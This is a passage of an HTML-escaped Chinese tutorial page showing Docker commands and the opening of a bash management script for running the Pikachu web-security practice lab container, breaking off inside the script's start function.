&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="持久化运行"&gt;持久化运行
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo docker stop pikachu
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo docker rm pikachu &lt;span class="c1"&gt;# 停止并删除容器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 创建命名数据卷&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo docker volume create pikachu_data
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;启动脚本（pikachu-start.bash）:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt; 10
&lt;/span&gt;&lt;span class="lnt"&gt; 11
&lt;/span&gt;&lt;span class="lnt"&gt; 12
&lt;/span&gt;&lt;span class="lnt"&gt; 13
&lt;/span&gt;&lt;span class="lnt"&gt; 14
&lt;/span&gt;&lt;span class="lnt"&gt; 15
&lt;/span&gt;&lt;span class="lnt"&gt; 16
&lt;/span&gt;&lt;span class="lnt"&gt; 17
&lt;/span&gt;&lt;span class="lnt"&gt; 18
&lt;/span&gt;&lt;span class="lnt"&gt; 19
&lt;/span&gt;&lt;span class="lnt"&gt; 20
&lt;/span&gt;&lt;span class="lnt"&gt; 21
&lt;/span&gt;&lt;span class="lnt"&gt; 22
&lt;/span&gt;&lt;span class="lnt"&gt; 23
&lt;/span&gt;&lt;span class="lnt"&gt; 24
&lt;/span&gt;&lt;span class="lnt"&gt; 25
&lt;/span&gt;&lt;span class="lnt"&gt; 26
&lt;/span&gt;&lt;span class="lnt"&gt; 27
&lt;/span&gt;&lt;span class="lnt"&gt; 28
&lt;/span&gt;&lt;span class="lnt"&gt; 29
&lt;/span&gt;&lt;span class="lnt"&gt; 30
&lt;/span&gt;&lt;span class="lnt"&gt; 31
&lt;/span&gt;&lt;span class="lnt"&gt; 32
&lt;/span&gt;&lt;span class="lnt"&gt; 33
&lt;/span&gt;&lt;span class="lnt"&gt; 34
&lt;/span&gt;&lt;span class="lnt"&gt; 35
&lt;/span&gt;&lt;span class="lnt"&gt; 36
&lt;/span&gt;&lt;span class="lnt"&gt; 37
&lt;/span&gt;&lt;span class="lnt"&gt; 38
&lt;/span&gt;&lt;span class="lnt"&gt; 39
&lt;/span&gt;&lt;span class="lnt"&gt; 40
&lt;/span&gt;&lt;span class="lnt"&gt; 41
&lt;/span&gt;&lt;span class="lnt"&gt; 42
&lt;/span&gt;&lt;span class="lnt"&gt; 43
&lt;/span&gt;&lt;span class="lnt"&gt; 44
&lt;/span&gt;&lt;span class="lnt"&gt; 45
&lt;/span&gt;&lt;span class="lnt"&gt; 46
&lt;/span&gt;&lt;span class="lnt"&gt; 47
&lt;/span&gt;&lt;span class="lnt"&gt; 48
&lt;/span&gt;&lt;span class="lnt"&gt; 49
&lt;/span&gt;&lt;span class="lnt"&gt; 50
&lt;/span&gt;&lt;span class="lnt"&gt; 51
&lt;/span&gt;&lt;span class="lnt"&gt; 52
&lt;/span&gt;&lt;span class="lnt"&gt; 53
&lt;/span&gt;&lt;span class="lnt"&gt; 54
&lt;/span&gt;&lt;span class="lnt"&gt; 55
&lt;/span&gt;&lt;span class="lnt"&gt; 56
&lt;/span&gt;&lt;span class="lnt"&gt; 57
&lt;/span&gt;&lt;span class="lnt"&gt; 58
&lt;/span&gt;&lt;span class="lnt"&gt; 59
&lt;/span&gt;&lt;span class="lnt"&gt; 60
&lt;/span&gt;&lt;span class="lnt"&gt; 61
&lt;/span&gt;&lt;span class="lnt"&gt; 62
&lt;/span&gt;&lt;span class="lnt"&gt; 63
&lt;/span&gt;&lt;span class="lnt"&gt; 64
&lt;/span&gt;&lt;span class="lnt"&gt; 65
&lt;/span&gt;&lt;span class="lnt"&gt; 66
&lt;/span&gt;&lt;span class="lnt"&gt; 67
&lt;/span&gt;&lt;span class="lnt"&gt; 68
&lt;/span&gt;&lt;span class="lnt"&gt; 69
&lt;/span&gt;&lt;span class="lnt"&gt; 70
&lt;/span&gt;&lt;span class="lnt"&gt; 71
&lt;/span&gt;&lt;span class="lnt"&gt; 72
&lt;/span&gt;&lt;span class="lnt"&gt; 73
&lt;/span&gt;&lt;span class="lnt"&gt; 74
&lt;/span&gt;&lt;span class="lnt"&gt; 75
&lt;/span&gt;&lt;span class="lnt"&gt; 76
&lt;/span&gt;&lt;span class="lnt"&gt; 77
&lt;/span&gt;&lt;span class="lnt"&gt; 78
&lt;/span&gt;&lt;span class="lnt"&gt; 79
&lt;/span&gt;&lt;span class="lnt"&gt; 80
&lt;/span&gt;&lt;span class="lnt"&gt; 81
&lt;/span&gt;&lt;span class="lnt"&gt; 82
&lt;/span&gt;&lt;span class="lnt"&gt; 83
&lt;/span&gt;&lt;span class="lnt"&gt; 84
&lt;/span&gt;&lt;span class="lnt"&gt; 85
&lt;/span&gt;&lt;span class="lnt"&gt; 86
&lt;/span&gt;&lt;span class="lnt"&gt; 87
&lt;/span&gt;&lt;span class="lnt"&gt; 88
&lt;/span&gt;&lt;span class="lnt"&gt; 89
&lt;/span&gt;&lt;span class="lnt"&gt; 90
&lt;/span&gt;&lt;span class="lnt"&gt; 91
&lt;/span&gt;&lt;span class="lnt"&gt; 92
&lt;/span&gt;&lt;span class="lnt"&gt; 93
&lt;/span&gt;&lt;span class="lnt"&gt; 94
&lt;/span&gt;&lt;span class="lnt"&gt; 95
&lt;/span&gt;&lt;span class="lnt"&gt; 96
&lt;/span&gt;&lt;span class="lnt"&gt; 97
&lt;/span&gt;&lt;span class="lnt"&gt; 98
&lt;/span&gt;&lt;span class="lnt"&gt; 99
&lt;/span&gt;&lt;span class="lnt"&gt;100
&lt;/span&gt;&lt;span class="lnt"&gt;101
&lt;/span&gt;&lt;span class="lnt"&gt;102
&lt;/span&gt;&lt;span class="lnt"&gt;103
&lt;/span&gt;&lt;span class="lnt"&gt;104
&lt;/span&gt;&lt;span class="lnt"&gt;105
&lt;/span&gt;&lt;span class="lnt"&gt;106
&lt;/span&gt;&lt;span class="lnt"&gt;107
&lt;/span&gt;&lt;span class="lnt"&gt;108
&lt;/span&gt;&lt;span class="lnt"&gt;109
&lt;/span&gt;&lt;span class="lnt"&gt;110
&lt;/span&gt;&lt;span class="lnt"&gt;111
&lt;/span&gt;&lt;span class="lnt"&gt;112
&lt;/span&gt;&lt;span class="lnt"&gt;113
&lt;/span&gt;&lt;span class="lnt"&gt;114
&lt;/span&gt;&lt;span class="lnt"&gt;115
&lt;/span&gt;&lt;span class="lnt"&gt;116
&lt;/span&gt;&lt;span class="lnt"&gt;117
&lt;/span&gt;&lt;span class="lnt"&gt;118
&lt;/span&gt;&lt;span class="lnt"&gt;119
&lt;/span&gt;&lt;span class="lnt"&gt;120
&lt;/span&gt;&lt;span class="lnt"&gt;121
&lt;/span&gt;&lt;span class="lnt"&gt;122
&lt;/span&gt;&lt;span class="lnt"&gt;123
&lt;/span&gt;&lt;span class="lnt"&gt;124
&lt;/span&gt;&lt;span class="lnt"&gt;125
&lt;/span&gt;&lt;span class="lnt"&gt;126
&lt;/span&gt;&lt;span class="lnt"&gt;127
&lt;/span&gt;&lt;span class="lnt"&gt;128
&lt;/span&gt;&lt;span class="lnt"&gt;129
&lt;/span&gt;&lt;span class="lnt"&gt;130
&lt;/span&gt;&lt;span class="lnt"&gt;131
&lt;/span&gt;&lt;span class="lnt"&gt;132
&lt;/span&gt;&lt;span class="lnt"&gt;133
&lt;/span&gt;&lt;span class="lnt"&gt;134
&lt;/span&gt;&lt;span class="lnt"&gt;135
&lt;/span&gt;&lt;span class="lnt"&gt;136
&lt;/span&gt;&lt;span class="lnt"&gt;137
&lt;/span&gt;&lt;span class="lnt"&gt;138
&lt;/span&gt;&lt;span class="lnt"&gt;139
&lt;/span&gt;&lt;span class="lnt"&gt;140
&lt;/span&gt;&lt;span class="lnt"&gt;141
&lt;/span&gt;&lt;span class="lnt"&gt;142
&lt;/span&gt;&lt;span class="lnt"&gt;143
&lt;/span&gt;&lt;span class="lnt"&gt;144
&lt;/span&gt;&lt;span class="lnt"&gt;145
&lt;/span&gt;&lt;span class="lnt"&gt;146
&lt;/span&gt;&lt;span class="lnt"&gt;147
&lt;/span&gt;&lt;span class="lnt"&gt;148
&lt;/span&gt;&lt;span class="lnt"&gt;149
&lt;/span&gt;&lt;span class="lnt"&gt;150
&lt;/span&gt;&lt;span class="lnt"&gt;151
&lt;/span&gt;&lt;span class="lnt"&gt;152
&lt;/span&gt;&lt;span class="lnt"&gt;153
&lt;/span&gt;&lt;span class="lnt"&gt;154
&lt;/span&gt;&lt;span class="lnt"&gt;155
&lt;/span&gt;&lt;span class="lnt"&gt;156
&lt;/span&gt;&lt;span class="lnt"&gt;157
&lt;/span&gt;&lt;span class="lnt"&gt;158
&lt;/span&gt;&lt;span class="lnt"&gt;159
&lt;/span&gt;&lt;span class="lnt"&gt;160
&lt;/span&gt;&lt;span class="lnt"&gt;161
&lt;/span&gt;&lt;span class="lnt"&gt;162
&lt;/span&gt;&lt;span class="lnt"&gt;163
&lt;/span&gt;&lt;span class="lnt"&gt;164
&lt;/span&gt;&lt;span class="lnt"&gt;165
&lt;/span&gt;&lt;span class="lnt"&gt;166
&lt;/span&gt;&lt;span class="lnt"&gt;167
&lt;/span&gt;&lt;span class="lnt"&gt;168
&lt;/span&gt;&lt;span class="lnt"&gt;169
&lt;/span&gt;&lt;span class="lnt"&gt;170
&lt;/span&gt;&lt;span class="lnt"&gt;171
&lt;/span&gt;&lt;span class="lnt"&gt;172
&lt;/span&gt;&lt;span class="lnt"&gt;173
&lt;/span&gt;&lt;span class="lnt"&gt;174
&lt;/span&gt;&lt;span class="lnt"&gt;175
&lt;/span&gt;&lt;span class="lnt"&gt;176
&lt;/span&gt;&lt;span class="lnt"&gt;177
&lt;/span&gt;&lt;span class="lnt"&gt;178
&lt;/span&gt;&lt;span class="lnt"&gt;179
&lt;/span&gt;&lt;span class="lnt"&gt;180
&lt;/span&gt;&lt;span class="lnt"&gt;181
&lt;/span&gt;&lt;span class="lnt"&gt;182
&lt;/span&gt;&lt;span class="lnt"&gt;183
&lt;/span&gt;&lt;span class="lnt"&gt;184
&lt;/span&gt;&lt;span class="lnt"&gt;185
&lt;/span&gt;&lt;span class="lnt"&gt;186
&lt;/span&gt;&lt;span class="lnt"&gt;187
&lt;/span&gt;&lt;span class="lnt"&gt;188
&lt;/span&gt;&lt;span class="lnt"&gt;189
&lt;/span&gt;&lt;span class="lnt"&gt;190
&lt;/span&gt;&lt;span class="lnt"&gt;191
&lt;/span&gt;&lt;span class="lnt"&gt;192
&lt;/span&gt;&lt;span class="lnt"&gt;193
&lt;/span&gt;&lt;span class="lnt"&gt;194
&lt;/span&gt;&lt;span class="lnt"&gt;195
&lt;/span&gt;&lt;span class="lnt"&gt;196
&lt;/span&gt;&lt;span class="lnt"&gt;197
&lt;/span&gt;&lt;span class="lnt"&gt;198
&lt;/span&gt;&lt;span class="lnt"&gt;199
&lt;/span&gt;&lt;span class="lnt"&gt;200
&lt;/span&gt;&lt;span class="lnt"&gt;201
&lt;/span&gt;&lt;span class="lnt"&gt;202
&lt;/span&gt;&lt;span class="lnt"&gt;203
&lt;/span&gt;&lt;span class="lnt"&gt;204
&lt;/span&gt;&lt;span class="lnt"&gt;205
&lt;/span&gt;&lt;span class="lnt"&gt;206
&lt;/span&gt;&lt;span class="lnt"&gt;207
&lt;/span&gt;&lt;span class="lnt"&gt;208
&lt;/span&gt;&lt;span class="lnt"&gt;209
&lt;/span&gt;&lt;span class="lnt"&gt;210
&lt;/span&gt;&lt;span class="lnt"&gt;211
&lt;/span&gt;&lt;span class="lnt"&gt;212
&lt;/span&gt;&lt;span class="lnt"&gt;213
&lt;/span&gt;&lt;span class="lnt"&gt;214
&lt;/span&gt;&lt;span class="lnt"&gt;215
&lt;/span&gt;&lt;span class="lnt"&gt;216
&lt;/span&gt;&lt;span class="lnt"&gt;217
&lt;/span&gt;&lt;span class="lnt"&gt;218
&lt;/span&gt;&lt;span class="lnt"&gt;219
&lt;/span&gt;&lt;span class="lnt"&gt;220
&lt;/span&gt;&lt;span class="lnt"&gt;221
&lt;/span&gt;&lt;span class="lnt"&gt;222
&lt;/span&gt;&lt;span class="lnt"&gt;223
&lt;/span&gt;&lt;span class="lnt"&gt;224
&lt;/span&gt;&lt;span class="lnt"&gt;225
&lt;/span&gt;&lt;span class="lnt"&gt;226
&lt;/span&gt;&lt;span class="lnt"&gt;227
&lt;/span&gt;&lt;span class="lnt"&gt;228
&lt;/span&gt;&lt;span class="lnt"&gt;229
&lt;/span&gt;&lt;span class="lnt"&gt;230
&lt;/span&gt;&lt;span class="lnt"&gt;231
&lt;/span&gt;&lt;span class="lnt"&gt;232
&lt;/span&gt;&lt;span class="lnt"&gt;233
&lt;/span&gt;&lt;span class="lnt"&gt;234
&lt;/span&gt;&lt;span class="lnt"&gt;235
&lt;/span&gt;&lt;span class="lnt"&gt;236
&lt;/span&gt;&lt;span class="lnt"&gt;237
&lt;/span&gt;&lt;span class="lnt"&gt;238
&lt;/span&gt;&lt;span class="lnt"&gt;239
&lt;/span&gt;&lt;span class="lnt"&gt;240
&lt;/span&gt;&lt;span class="lnt"&gt;241
&lt;/span&gt;&lt;span class="lnt"&gt;242
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# pikachu-manager.sh - Pikachu Docker 容器管理脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;pikachu&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;IMAGE_NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;area39/pikachu&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;8001:80&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;pikachu_data&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;VOLUME_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/app/data&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 颜色定义&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\033[0;31m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\033[0;32m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\033[1;33m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\033[0;34m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\033[0m&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# No Color&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;show_usage&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;Pikachu 容器管理脚本&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;用法: &lt;/span&gt;&lt;span class="nv"&gt;$0&lt;/span&gt;&lt;span class="s2"&gt; [命令]&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;命令:&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; start 启动容器&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; stop 停止容器&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; restart 重启容器&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; status 查看容器状态&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; logs 查看容器日志&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; remove 删除容器（保留数据卷）&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; purge 彻底删除（容器+数据卷）&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; backup 备份数据卷&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; shell 进入容器shell&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;check_docker&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; ! &lt;span class="nb"&gt;command&lt;/span&gt; -v docker &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&amp;gt; /dev/null&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;错误: Docker 未安装&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; ! sudo docker info &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&amp;gt; /dev/null&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;错误: Docker 服务未运行或无权限&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;请确保Docker服务正在运行，或使用sudo权限&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;start_container&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在启动 Pikachu 容器...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 检查镜像是否存在，不存在则拉取&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; ! sudo docker images &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$IMAGE_NAME&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="s1"&gt;&amp;#39;:&amp;#39;&lt;/span&gt; -f1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
